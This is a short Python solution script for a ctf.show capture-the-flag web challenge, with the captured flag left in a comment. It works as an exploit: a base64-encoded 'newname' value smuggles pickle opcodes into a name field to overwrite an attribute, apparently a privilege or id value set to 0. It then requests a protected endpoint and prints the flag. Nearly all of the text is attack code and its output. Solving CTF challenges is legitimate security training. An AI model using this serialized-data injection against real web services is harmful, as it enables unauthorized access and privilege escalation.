import requests
from base64 import b64encode

url="http://352e8667-e5cc-44df-8b62-451e0326788b.challenge.ctf.show/"
requests.get(url+'?name=xxx')
requests.get(url+'change?name='+b64encode(b'xxx').decode()+'&newname='+b64encode(b"xxx\nsVid\nI0\nsb.").decode())
# change?name=eHh4&newname=eHh4CnNWaWQKSTAKc2Iu
r = requests.get(url+'dacaiji?name=xxx')
print(r.text)
# ctfshow{07d87867-80b7-497f-9d18-6db4f498cab5}